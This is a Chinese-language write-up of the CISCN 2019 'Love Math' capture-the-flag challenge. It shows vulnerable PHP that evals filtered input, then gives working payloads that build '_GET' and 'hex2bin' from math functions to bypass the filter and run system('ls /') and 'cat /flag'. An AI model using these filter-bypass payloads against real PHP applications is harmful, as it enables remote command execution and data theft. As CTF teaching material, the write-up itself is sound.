# CISCN 2019

## 0x01 Love Math

关键词：敏感函数，代码执行

* 进入界面后发现源代码：

* ```
  <?php
  error_reporting(0);
  //听说你很喜欢数学，不知道你是否爱它胜过爱flag
  if(!isset($_GET['c'])){
      show_source(__FILE__);
  }else{
      //例子 c=20-1
      $content = $_GET['c'];
      if (strlen($content) >= 80) {
          die("太长了不会算");
      }
      $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
      foreach ($blacklist as $blackitem) {
          if (preg_match('/' . $blackitem . '/m', $content)) {
              die("请不要输入奇奇怪怪的字符");
          }
      }
      //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
      $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
      preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
      foreach ($used_funcs[0] as $func) {
          if (!in_array($func, $whitelist)) {
              die("请不要输入奇奇怪怪的函数");
          }
      }
      //帮你算出答案
      eval('echo '.$content.';');
  }
  ```

  可见这是只允许c中传入数学函数的一个题目

* ### 延伸知识：php敏感函数

* ```
  base_convert(37907361743,10,36) ==>"hex2bin"
  dechex(1598506324) ==>"5f474554"
  $pi = hex2bin("5f474554") ==>$pi="_GET"
  ```

  由于这三项基本信息，我们可以构造一个payload：

  ```
  c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=ls /
  ==> c=$pi=_GET;($_GET){pi}($_GET){abs}&pi=system&abs=ls /
  ```

  即效果为执行`system(ls /)`语句

  进一步构造payload：

  ```
  c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag
  ```

  ![CIS1](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/assets/CIS1.png)
